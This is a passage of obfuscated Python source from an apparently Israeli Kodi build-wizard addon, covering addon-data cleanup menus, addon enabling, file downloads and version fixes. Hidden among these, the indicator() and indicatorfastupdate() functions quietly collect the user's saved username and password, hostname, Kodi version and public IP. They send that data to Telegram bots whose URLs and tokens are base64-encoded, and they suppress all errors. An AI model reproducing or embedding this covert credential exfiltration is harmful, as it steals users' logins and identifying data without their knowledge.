		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3729
def removeAddonDataMenu ():#line:3731
	if os .path .exists (ADDOND ):#line:3732
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3733
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3734
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3735
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3736
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3737
		OO0OOO00O000OOOO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3738
		for O0OO00OO00000OOO0 in sorted (OO0OOO00O000OOOO0 ,key =lambda O0O0O000OOOO000OO :O0O0O000OOOO000OO ):#line:3739
			O0000O000O0000000 =O0OO00OO00000OOO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3740
			O00O00000OO00O00O =os .path .join (O0OO00OO00000OOO0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3741
			OOOO00O0OOOOO0O00 =os .path .join (O0OO00OO00000OOO0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3742
			OOO00O00OOO000O0O =O0000O000O0000000 #line:3743
			OOO000OOOOOO0O00O ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3744
			for OO0OO0O0OO00O0OOO in OOO000OOOOOO0O00O :#line:3745
				OOO00O00OOO000O0O =OOO00O00OOO000O0O .replace (OO0OO0O0OO00O0OOO ,OOO000OOOOOO0O00O [OO0OO0O0OO00O0OOO ])#line:3746
			if O0000O000O0000000 in EXCLUDES :OOO00O00OOO000O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO00O00OOO000O0O #line:3747
			else :OOO00O00OOO000O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO00O00OOO000O0O #line:3748
			addFile (' %s'%OOO00O00OOO000O0O ,'removedata',O0000O000O0000000 ,icon =O00O00000OO00O00O ,fanart =OOOO00O0OOOOO0O00 ,themeit =THEME2 )#line:3749
	else :#line:3750
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3751
	setView ('files','viewType')#line:3752
def enableAddons ():#line:3754
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3755
	OO000000OO000000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3756
	OO00O0OOO00OO0O0O =0 #line:3757
	for OO00OOOOOO0000O0O in sorted (OO000000OO000000O ,key =lambda O00OO00OOO000OOOO :O00OO00OOO000OOOO ):#line:3758
		O0000OOO0O00OOOO0 =os .path .split (OO00OOOOOO0000O0O [:-1 ])[1 ]#line:3759
		if O0000OOO0O00OOOO0 in EXCLUDES :continue #line:3760
		if O0000OOO0O00OOOO0 in DEFAULTPLUGINS :continue #line:3761
		O0OOOO00O0OOO00OO =os .path .join (OO00OOOOOO0000O0O ,'addon.xml')#line:3762
		if os .path .exists (O0OOOO00O0OOO00OO ):#line:3763
			OO00O0OOO00OO0O0O +=1 #line:3764
			OO000000OO000000O =OO00OOOOOO0000O0O .replace (ADDONS ,'')[1 :-1 ]#line:3765
			O0OOO00O0OO0OO0O0 =open (O0OOOO00O0OOO00OO )#line:3766
			OO0O0OOO0OOOOO0OO =O0OOO00O0OO0OO0O0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3767
			OOO0OOO00O000O00O =wiz .parseDOM (OO0O0OOO0OOOOO0OO ,'addon',ret ='id')#line:3768
			OO0O0O0O0O0OOOO0O =wiz .parseDOM (OO0O0OOO0OOOOO0OO ,'addon',ret ='name')#line:3769
			try :#line:3770
				OO00O00O0OOO00O00 =OOO0OOO00O000O00O [0 ]#line:3771
				OO000O0O0OO0OO0OO =OO0O0O0O0O0OOOO0O [0 ]#line:3772
			except :#line:3773
				continue #line:3774
			try :#line:3775
				O0OOO0OO00O0O0OO0 =xbmcaddon .Addon (id =OO00O00O0OOO00O00 )#line:3776
				OOO00O00O0O0O00O0 ="[COLOR green][Enabled][/COLOR]"#line:3777
				OOO00OOO0O000O00O ="false"#line:3778
			except :#line:3779
				OOO00O00O0O0O00O0 ="[COLOR red][Disabled][/COLOR]"#line:3780
				OOO00OOO0O000O00O ="true"#line:3781
				pass #line:3782
			OO0O0O0000OOOO00O =os .path .join (OO00OOOOOO0000O0O ,'icon.png')if os .path .exists (os .path .join (OO00OOOOOO0000O0O ,'icon.png'))else ICON #line:3783
			O0OO00000O00O00O0 =os .path .join (OO00OOOOOO0000O0O ,'fanart.jpg')if os .path .exists (os .path .join (OO00OOOOOO0000O0O ,'fanart.jpg'))else FANART #line:3784
			addFile ("%s %s"%(OOO00O00O0O0O00O0 ,OO000O0O0OO0OO0OO ),'toggleaddon',OO000000OO000000O ,OOO00OOO0O000O00O ,icon =OO0O0O0000OOOO00O ,fanart =O0OO00000O00O00O0 )#line:3785
			O0OOO00O0OO0OO0O0 .close ()#line:3786
	if OO00O0OOO00OO0O0O ==0 :#line:3787
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3788
	setView ('files','viewType')#line:3789
def changeFeq ():#line:3791
	O00OO000OOOOO0OOO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3792
	O00O00O00000OOO00 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O00OO000OOOOO0OOO )#line:3793
	if not O00O00O00000OOO00 ==-1 :#line:3794
		wiz .setS ('autocleanfeq',str (O00O00O00000OOO00 ))#line:3795
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O00OO000OOOOO0OOO [O00O00O00000OOO00 ]))#line:3796
def developer ():#line:3798
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3799
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3800
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3801
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3802
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3803
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3804
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3805
	setView ('files','viewType')#line:3807
def download (OO0000O0000OOO0OO ,OOO000OOO0OOOOO00 ):#line:3812
  O000O0O00OO0O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3813
  O00O00OO0O00O0OO0 =xbmcgui .DialogProgress ()#line:3814
  O00O00OO0O00O0OO0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3815
  O0000O0O0O00OO000 =os .path .join (O000O0O00OO0O0OO0 ,'isr.zip')#line:3816
  O0OOO0OO0OOO00O0O =urllib2 .Request (OO0000O0000OOO0OO )#line:3817
  O0O0000000000OO00 =urllib2 .urlopen (O0OOO0OO0OOO00O0O )#line:3818
  O0OOOOO0OO0OOOO0O =xbmcgui .DialogProgress ()#line:3820
  O0OOOOO0OO0OOOO0O .create ("Downloading","Downloading "+name )#line:3821
  O0OOOOO0OO0OOOO0O .update (0 )#line:3822
  O0O00OO000000000O =OOO000OOO0OOOOO00 #line:3823
  O0000O0O0OO0000O0 =open (O0000O0O0O00OO000 ,'wb')#line:3824
  try :#line:3826
    O0000000OOOO0OOO0 =O0O0000000000OO00 .info ().getheader ('Content-Length').strip ()#line:3827
    OOOOOOOOO000O00O0 =True #line:3828
  except AttributeError :#line:3829
        OOOOOOOOO000O00O0 =False #line:3830
  if OOOOOOOOO000O00O0 :#line:3832
        O0000000OOOO0OOO0 =int (O0000000OOOO0OOO0 )#line:3833
  OOO000OOOO00OO000 =0 #line:3835
  O000O000O000O000O =time .time ()#line:3836
  while True :#line:3837
        OO0000O0OOOOOO00O =O0O0000000000OO00 .read (8192 )#line:3838
        if not OO0000O0OOOOOO00O :#line:3839
            sys .stdout .write ('\n')#line:3840
            break #line:3841
        OOO000OOOO00OO000 +=len (OO0000O0OOOOOO00O )#line:3843
        O0000O0O0OO0000O0 .write (OO0000O0OOOOOO00O )#line:3844
        if not OOOOOOOOO000O00O0 :#line:3846
            O0000000OOOO0OOO0 =OOO000OOOO00OO000 #line:3847
        if O0OOOOO0OO0OOOO0O .iscanceled ():#line:3848
           O0OOOOO0OO0OOOO0O .close ()#line:3849
           try :#line:3850
            os .remove (O0000O0O0O00OO000 )#line:3851
           except :#line:3852
            pass #line:3853
           break #line:3854
        O000O0O00OOO00OOO =float (OOO000OOOO00OO000 )/O0000000OOOO0OOO0 #line:3855
        O000O0O00OOO00OOO =round (O000O0O00OOO00OOO *100 ,2 )#line:3856
        OO0O000O0OOOOOOO0 =OOO000OOOO00OO000 /(1024 *1024 )#line:3857
        O000O0OO0O00O0O0O =O0000000OOOO0OOO0 /(1024 *1024 )#line:3858
        OOO00O0O0O0000000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O000O0OOOOOOO0 ,'teal',O000O0OO0O00O0O0O )#line:3859
        if (time .time ()-O000O000O000O000O )>0 :#line:3860
          OO0OO00O00000O0O0 =OOO000OOOO00OO000 /(time .time ()-O000O000O000O000O )#line:3861
          OO0OO00O00000O0O0 =OO0OO00O00000O0O0 /1024 #line:3862
        else :#line:3863
         OO0OO00O00000O0O0 =0 #line:3864
        O00O00000O0O0O0O0 ='KB'#line:3865
        if OO0OO00O00000O0O0 >=1024 :#line:3866
           OO0OO00O00000O0O0 =OO0OO00O00000O0O0 /1024 #line:3867
           O00O00000O0O0O0O0 ='MB'#line:3868
        if OO0OO00O00000O0O0 >0 and not O000O0O00OOO00OOO ==100 :#line:3869
            O0OOOO000OOO00OOO =(O0000000OOOO0OOO0 -OOO000OOOO00OO000 )/OO0OO00O00000O0O0 #line:3870
        else :#line:3871
            O0OOOO000OOO00OOO =0 #line:3872
        O00OOOO0O0O00OOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OO00O00000O0O0 ,O00O00000O0O0O0O0 )#line:3873
        O0OOOOO0OO0OOOO0O .update (int (O000O0O00OOO00OOO ),"Downloading "+name ,OOO00O0O0O0000000 ,O00OOOO0O0O00OOOO )#line:3875
  O00O00000OOO0OO00 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3878
  O0000O0O0OO0000O0 .close ()#line:3880
  extract (O0000O0O0O00OO000 ,O00O00000OOO0OO00 ,O0OOOOO0OO0OOOO0O )#line:3882
  if os .path .exists (O00O00000OOO0OO00 +'/scakemyer-script.quasar.burst'):#line:3883
    if os .path .exists (O00O00000OOO0OO00 +'/script.quasar.burst'):#line:3884
     shutil .rmtree (O00O00000OOO0OO00 +'/script.quasar.burst',ignore_errors =False )#line:3885
    os .rename (O00O00000OOO0OO00 +'/scakemyer-script.quasar.burst',O00O00000OOO0OO00 +'/script.quasar.burst')#line:3886
  if os .path .exists (O00O00000OOO0OO00 +'/plugin.video.kmediatorrent-master'):#line:3888
    if os .path .exists (O00O00000OOO0OO00 +'/plugin.video.kmediatorrent'):#line:3889
     shutil .rmtree (O00O00000OOO0OO00 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3890
    os .rename (O00O00000OOO0OO00 +'/plugin.video.kmediatorrent-master',O00O00000OOO0OO00 +'/plugin.video.kmediatorrent')#line:3891
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3892
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3893
  try :#line:3894
    os .remove (O0000O0O0O00OO000 )#line:3895
  except :#line:3896
    pass #line:3897
  O0OOOOO0OO0OOOO0O .close ()#line:3898
def dis_or_enable_addon (OO0OO00000OO0O0O0 ,O00O0OO00000O0000 ,enable ="true"):#line:3899
    import json #line:3900
    OO0OO0OOO000000OO ='"%s"'%OO0OO00000OO0O0O0 #line:3901
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO00000OO0O0O0 )and enable =="true":#line:3902
        logging .warning ('already Enabled')#line:3903
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0OO00000OO0O0O0 )#line:3904
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO00000OO0O0O0 )and enable =="false":#line:3905
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0OO00000OO0O0O0 )#line:3906
    else :#line:3907
        OOO00000OO00O0OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0OO0OOO000000OO ,enable )#line:3908
        O0OOO00OOOO00O0O0 =xbmc .executeJSONRPC (OOO00000OO00O0OOO )#line:3909
        OO0O0OOOOOOOOOO00 =json .loads (O0OOO00OOOO00O0O0 )#line:3910
        if enable =="true":#line:3911
            xbmc .log ("### Enabled %s, response = %s"%(OO0OO00000OO0O0O0 ,OO0O0OOOOOOOOOO00 ))#line:3912
        else :#line:3913
            xbmc .log ("### Disabled %s, response = %s"%(OO0OO00000OO0O0O0 ,OO0O0OOOOOOOOOO00 ))#line:3914
    if O00O0OO00000O0000 =='auto':#line:3915
     return True #line:3916
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3917
def chunk_report (OO0OO0OO0O00OO0OO ,OO00O0OOOO000OOOO ,OOO0000O0000000OO ):#line:3918
   O000OO0OOO00OOO0O =float (OO0OO0OO0O00OO0OO )/OOO0000O0000000OO #line:3919
   O000OO0OOO00OOO0O =round (O000OO0OOO00OOO0O *100 ,2 )#line:3920
   if OO0OO0OO0O00OO0OO >=OOO0000O0000000OO :#line:3922
      sys .stdout .write ('\n')#line:3923
def chunk_read (O0O0OOO00O00000O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3925
   import time #line:3926
   OO00OOOO0OOO0O0OO =int (filesize )*1000000 #line:3927
   O00OOO0000OOOOOOO =0 #line:3929
   O0OO0000O0OOOO00O =time .time ()#line:3930
   O00000O0OOO0000OO =0 #line:3931
   logging .warning ('Downloading')#line:3933
   with open (destination ,"wb")as O0O0000O0OOOOO0O0 :#line:3934
    while 1 :#line:3935
      OOO0O0OO0000OO0OO =time .time ()-O0OO0000O0OOOO00O #line:3936
      OOOOO0OO00000O000 =int (O00000O0OOO0000OO *chunk_size )#line:3937
      O0O00OO00O00OO000 =O0O0OOO00O00000O0 .read (chunk_size )#line:3938
      O0O0000O0OOOOO0O0 .write (O0O00OO00O00OO000 )#line:3939
      O0O0000O0OOOOO0O0 .flush ()#line:3940
      O00OOO0000OOOOOOO +=len (O0O00OO00O00OO000 )#line:3941
      OO0O00O0O0OOOO00O =float (O00OOO0000OOOOOOO )/OO00OOOO0OOO0O0OO #line:3942
      OO0O00O0O0OOOO00O =round (OO0O00O0O0OOOO00O *100 ,2 )#line:3943
      if int (OOO0O0OO0000OO0OO )>0 :#line:3944
        O0OOO00OO0O00000O =int (OOOOO0OO00000O000 /(1024 *OOO0O0OO0000OO0OO ))#line:3945
      else :#line:3946
         O0OOO00OO0O00000O =0 #line:3947
      if O0OOO00OO0O00000O >1024 and not OO0O00O0O0OOOO00O ==100 :#line:3948
          O0OOOO0O0OO00OO00 =int (((OO00OOOO0OOO0O0OO -OOOOO0OO00000O000 )/1024 )/(O0OOO00OO0O00000O ))#line:3949
      else :#line:3950
          O0OOOO0O0OO00OO00 =0 #line:3951
      if O0OOOO0O0OO00OO00 <0 :#line:3952
        O0OOOO0O0OO00OO00 =0 #line:3953
      dp .update (int (OO0O00O0O0OOOO00O ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0O00O0O0OOOO00O ,OOOOO0OO00000O000 /(1024 *1024 ),OO00OOOO0OOO0O0OO /(1000 *1000 ),O0OOO00OO0O00000O ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0OOOO0O0OO00OO00 ,60 ))#line:3954
      if dp .iscanceled ():#line:3955
         dp .close ()#line:3956
         break #line:3957
      if not O0O00OO00O00OO000 :#line:3958
         break #line:3959
      if report_hook :#line:3961
         report_hook (O00OOO0000OOOOOOO ,chunk_size ,OO00OOOO0OOO0O0OO )#line:3962
      O00000O0OOO0000OO +=1 #line:3963
   logging .warning ('END Downloading')#line:3964
   return O00OOO0000OOOOOOO #line:3965
def googledrive_download (O00000000O0OOO00O ,O0O0OOO0OO00OOOOO ,O00O0OO00OOOOO000 ,O000O00O00OOO00O0 ):#line:3967
    O0OOO000O00000000 =[]#line:3971
    O0O0O00O0OOOO0OOO =O00000000O0OOO00O .split ('=')#line:3972
    O00000000O0OOO00O =O0O0O00O0OOOO0OOO [len (O0O0O00O0OOOO0OOO )-1 ]#line:3973
    def OOO0O00O00000O0OO (O00O000O000OO000O ):#line:3975
        for OOOOOOO0OO0OOOO0O in O00O000O000OO000O :#line:3977
            logging .warning ('cookie.name')#line:3978
            logging .warning (OOOOOOO0OO0OOOO0O .name )#line:3979
            OOO0000000000OOO0 =OOOOOOO0OO0OOOO0O .value #line:3980
            if 'download_warning'in OOOOOOO0OO0OOOO0O .name :#line:3981
                logging .warning (OOOOOOO0OO0OOOO0O .value )#line:3982
                logging .warning ('cookie.value')#line:3983
                return OOOOOOO0OO0OOOO0O .value #line:3984
            return OOO0000000000OOO0 #line:3985
        return None #line:3987
    def O0000O000O0O0O0O0 (O0O00O0O0O0O00000 ,O00OOOOOOO0O000OO ):#line:3989
        OOOOOOOOOOOOO00O0 =32768 #line:3991
        O0OO0OO00O0OO0O00 =time .time ()#line:3992
        with open (O00OOOOOOO0O000OO ,"wb")as OOOOOO0000O00OOO0 :#line:3994
            OOOOO0OO0OOOOO0O0 =1 #line:3995
            O0OO000OO0OOO0000 =32768 #line:3996
            try :#line:3997
                O0O00O0O0OOO0OOOO =int (O0O00O0O0O0O00000 .headers .get ('content-length'))#line:3998
                print ('file total size :',O0O00O0O0OOO0OOOO )#line:3999
            except TypeError :#line:4000
                print ('using dummy length !!!')#line:4001
                O0O00O0O0OOO0OOOO =int (O000O00O00OOO00O0 )*1000000 #line:4002
            for OOOOOOO0OOOOO00OO in O0O00O0O0O0O00000 .iter_content (OOOOOOOOOOOOO00O0 ):#line:4003
                if OOOOOOO0OOOOO00OO :#line:4004
                    OOOOOO0000O00OOO0 .write (OOOOOOO0OOOOO00OO )#line:4005
                    OOOOOO0000O00OOO0 .flush ()#line:4006
                    O00OOOO0OO0O0OOO0 =time .time ()-O0OO0OO00O0OO0O00 #line:4007
                    OO0OOOOO0OO0000O0 =int (OOOOO0OO0OOOOO0O0 *O0OO000OO0OOO0000 )#line:4008
                    if O00OOOO0OO0O0OOO0 ==0 :#line:4009
                        O00OOOO0OO0O0OOO0 =0.1 #line:4010
                    OO000O00OO00O0OOO =int (OO0OOOOO0OO0000O0 /(1024 *O00OOOO0OO0O0OOO0 ))#line:4011
                    OOO0O0OOO0OOO0000 =int (OOOOO0OO0OOOOO0O0 *O0OO000OO0OOO0000 *100 /O0O00O0O0OOO0OOOO )#line:4012
                    if OO000O00OO00O0OOO >1024 and not OOO0O0OOO0OOO0000 ==100 :#line:4013
                      O00OO0OOO00OO0O0O =int (((O0O00O0O0OOO0OOOO -OO0OOOOO0OO0000O0 )/1024 )/(OO000O00OO00O0OOO ))#line:4014
                    else :#line:4015
                      O00OO0OOO00OO0O0O =0 #line:4016
                    O00O0OO00OOOOO000 .update (int (OOO0O0OOO0OOO0000 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0O0OOO0OOO0000 ,OO0OOOOO0OO0000O0 /(1024 *1024 ),O0O00O0O0OOO0OOOO /(1000 *1000 ),OO000O00OO00O0OOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00OO0OOO00OO0O0O ,60 ))#line:4018
                    OOOOO0OO0OOOOO0O0 +=1 #line:4019
                    if O00O0OO00OOOOO000 .iscanceled ():#line:4020
                     O00O0OO00OOOOO000 .close ()#line:4021
                     break #line:4022
    O00O0O0000O00O000 ="https://docs.google.com/uc?export=download"#line:4023
    import urllib2 #line:4028
    import cookielib #line:4029
    from cookielib import CookieJar #line:4031
    O0000O00OO0OOOO00 =CookieJar ()#line:4033
    O0OO0O0OO0OO0O00O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0000O00OO0OOOO00 ))#line:4034
    O00OOO00OOO0O0OOO ={'id':O00000000O0OOO00O }#line:4036
    OOOO0O0000O0OO0OO =urllib .urlencode (O00OOO00OOO0O0OOO )#line:4037
    logging .warning (O00O0O0000O00O000 +'&'+OOOO0O0000O0OO0OO )#line:4038
    O0OOO00O00OO0OO00 =O0OO0O0OO0OO0O00O .open (O00O0O0000O00O000 +'&'+OOOO0O0000O0OO0OO )#line:4039
    O0OOO0O00OO00OOO0 =O0OOO00O00OO0OO00 .read ()#line:4040
    for O0OOO0O0OOOO0O0OO in O0000O00OO0OOOO00 :#line:4042
         logging .warning (O0OOO0O0OOOO0O0OO )#line:4043
    OOOOOOO00OO0000OO =OOO0O00O00000O0OO (O0000O00OO0OOOO00 )#line:4044
    logging .warning (OOOOOOO00OO0000OO )#line:4045
    if OOOOOOO00OO0000OO :#line:4046
        O0O00000O00OO00OO ={'id':O00000000O0OOO00O ,'confirm':OOOOOOO00OO0000OO }#line:4047
        OO0O0OO0O0O0O000O ={'Access-Control-Allow-Headers':'Content-Length'}#line:4048
        OOOO0O0000O0OO0OO =urllib .urlencode (O0O00000O00OO00OO )#line:4049
        O0OOO00O00OO0OO00 =O0OO0O0OO0OO0O00O .open (O00O0O0000O00O000 +'&'+OOOO0O0000O0OO0OO )#line:4050
        chunk_read (O0OOO00O00OO0OO00 ,report_hook =chunk_report ,dp =O00O0OO00OOOOO000 ,destination =O0O0OOO0OO00OOOOO ,filesize =O000O00O00OOO00O0 )#line:4051
    return (O0OOO000O00000000 )#line:4055
def kodi17Fix ():#line:4056
	O00OO0OO000O0OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:4057
	O0OOOOOOO000OOO0O =[]#line:4058
	for O0000O0OO00OO0O00 in sorted (O00OO0OO000O0OOOO ,key =lambda OOO000OOOOO000OO0 :OOO000OOOOO000OO0 ):#line:4059
		O00OOOO00000OOO0O =os .path .join (O0000O0OO00OO0O00 ,'addon.xml')#line:4060
		if os .path .exists (O00OOOO00000OOO0O ):#line:4061
			O00O00OOOOOOO00O0 =O0000O0OO00OO0O00 .replace (ADDONS ,'')[1 :-1 ]#line:4062
			OOOO00O000O0OOOO0 =open (O00OOOO00000OOO0O )#line:4063
			OOOO0000000000OO0 =OOOO00O000O0OOOO0 .read ()#line:4064
			OO0OO00O0OO0O0O00 =parseDOM (OOOO0000000000OO0 ,'addon',ret ='id')#line:4065
			OOOO00O000O0OOOO0 .close ()#line:4066
			try :#line:4067
				O000O0O0O0O0OO0OO =xbmcaddon .Addon (id =OO0OO00O0OO0O0O00 [0 ])#line:4068
			except :#line:4069
				try :#line:4070
					log ("%s was disabled"%OO0OO00O0OO0O0O00 [0 ],xbmc .LOGDEBUG )#line:4071
					O0OOOOOOO000OOO0O .append (OO0OO00O0OO0O0O00 [0 ])#line:4072
				except :#line:4073
					try :#line:4074
						log ("%s was disabled"%O00O00OOOOOOO00O0 ,xbmc .LOGDEBUG )#line:4075
						O0OOOOOOO000OOO0O .append (O00O00OOOOOOO00O0 )#line:4076
					except :#line:4077
						if len (OO0OO00O0OO0O0O00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00O00OOOOOOO00O0 ,xbmc .LOGERROR )#line:4078
						else :log ("Unabled to enable: %s"%O0000O0OO00OO0O00 ,xbmc .LOGERROR )#line:4079
	if len (O0OOOOOOO000OOO0O )>0 :#line:4080
		OOOO00O00000OOO0O =0 #line:4081
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:4082
		for OO0O0OOO0O00000OO in O0OOOOOOO000OOO0O :#line:4083
			OOOO00O00000OOO0O +=1 #line:4084
			O00OO0OO000O0O000 =int (percentage (OOOO00O00000OOO0O ,len (O0OOOOOOO000OOO0O )))#line:4085
			DP .update (O00OO0OO000O0O000 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OOO0O00000OO ))#line:4086
			addonDatabase (OO0O0OOO0O00000OO ,1 )#line:4087
			if DP .iscanceled ():break #line:4088
		if DP .iscanceled ():#line:4089
			DP .close ()#line:4090
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:4091
			sys .exit ()#line:4092
		DP .close ()#line:4093
	forceUpdate ()#line:4094
def indicator ():#line:4096
       try :#line:4097
          import json #line:4098
          wiz .log ('FRESH MESSAGE')#line:4099
          OO0000O00O000O0OO =(ADDON .getSetting ("user"))#line:4100
          OO00O0OOOOO0OO000 =(ADDON .getSetting ("pass"))#line:4101
          OOO00OOOO00OOO00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4102
          OOO0OO000O0O0O000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:4103
          O000O0O00O0OOOO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4104
          O00O000O0OOOO0OOO =str (json .loads (O000O0O00O0OOOO00 )['ip'])#line:4105
          O00OO00OOO000OO00 =OO0000O00O000O0OO #line:4106
          O000OO0O00OOO0OOO =OO00O0OOOOO0OO000 #line:4107
          import socket #line:4108
          O000O0O00O0OOOO00 =urllib2 .urlopen (OOO0OO000O0O0O000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00OO00OOO000OO00 +' - '+O000OO0O00OOO0OOO +' - '+OOO00OOOO00OOO00O +' - '+O00O000O0OOOO0OOO ).readlines ()#line:4109
       except :pass #line:4111
def indicatorfastupdate ():#line:4113
       try :#line:4114
          import json #line:4115
          wiz .log ('FRESH MESSAGE')#line:4116
          O0O00OOO00OOO0OO0 =(ADDON .getSetting ("user"))#line:4117
          O000000OOOOO0O000 =(ADDON .getSetting ("pass"))#line:4118
          O0O0O0O00O0OO0OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4119
          OOOO0OO00O000O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:4121
          OO00000OO00OO0O0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4122
          OOOOO00000O0OO0O0 =str (json .loads (OO00000OO00OO0O0O )['ip'])#line:4123
          OO0OOOO0OO00O0OO0 =O0O00OOO00OOO0OO0 #line:4124
          O00O0OOO000OOOO00 =O000000OOOOO0O000 #line:4125
          import socket #line:4127
          OO00000OO00OO0O0O =urllib2 .urlopen (OOOO0OO00O000O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0OOOO0OO00O0OO0 +' - '+O00O0OOO000OOOO00 +' - '+O0O0O0O00O0OO0OO0 +' - '+OOOOO00000O0OO0O0 ).readlines ()#line:4128
       except :pass #line:4130
def skinfix18 ():#line:4132
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:4133
		O0O000OO00O0000O0 =wiz .workingURL (SKINID18DDONXML )#line:4134
		if O0O000OO00O0000O0 ==True :#line:4135
			OO0O0000O0OO00000 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:4136
			if len (OO0O0000O0OO00000 )>0 :#line:4137
				O000OO0O0OO0O0000 ='%s-%s.zip'%(SKINID18 ,OO0O0000O0OO00000 [0 ])#line:4138
				O0OO000O0O0000O0O =wiz .workingURL (SKIN18ZIPURL +O000OO0O0OO0O0000 )#line:4139
				if O0OO000O0O0000O0O ==True :#line:4140
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4141
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4142
